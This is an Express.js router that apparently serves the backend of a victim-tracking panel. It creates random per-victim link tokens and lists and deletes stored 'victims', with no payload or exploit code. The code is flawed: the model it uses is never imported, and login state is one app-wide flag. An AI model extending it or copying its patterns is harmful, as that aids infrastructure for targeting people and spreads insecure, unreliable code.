const express=require("express");
const crypto=require("crypto");
const mongoose=require("mongoose");
//middleware
const hasAuthHandler=require("../middleware/hasAuthHandler");

const router= express.Router();

router.post("/link",hasAuthHandler,generateLink);

router.post("/remove",hasAuthHandler,removeVictim);

router.get("/get",hasAuthHandler,getVictim);

router.get("/logout",hasAuthHandler,logout);

async function generateLink(req,res)
{
		
			let {victimname}=req.body;
			if(victimname){

				const token=crypto.randomBytes(5).toString("hex");
				victim=await victimmodel.findOne({token:token});
				if(victim)
				{
							res.json({"status":"Try Again"});
				}
				else
				{
					 data=new victimmodel({token:token,victimname:victimname});
					 data.save().then((doc)=>
					 				{										
					 					res.json({"status":"Sucess","token":token})
					 				})
					 		.catch(err=>{res.sendStatus(400)});	
				}
			}
			else
			{
				res.json({"status":"Failed",msg:"no user name provided"});
			}
}

async function removeVictim(req,res)
{	
		let {token}=req.body;
		victimmodel.deleteOne({token:token},()=>{
											 	res.json({"status":"Sucess"});
										 	})
										 .catch((err)=>{res.json({"status":"Failed",msg:err.message});});

}

async function getVictim(req,res)
{
	if(req.app.locals.isAuth)
	{
		try
		{
			
			var victim=await victimmodel.find({});
		
			res.json({"status":"Sucess","victimdata":victim});
		}
		catch(err)
		{
			res.json({"status":"Failed","msg":err.message});
		}
	}
	else
	{
			res.json({status:"Failed",msg:"Unauthroize"});
	}
}

function logout(req,res) {
	req.app.locals.isAuth=false;
	res.redirect("/");
}
module.exports=router;
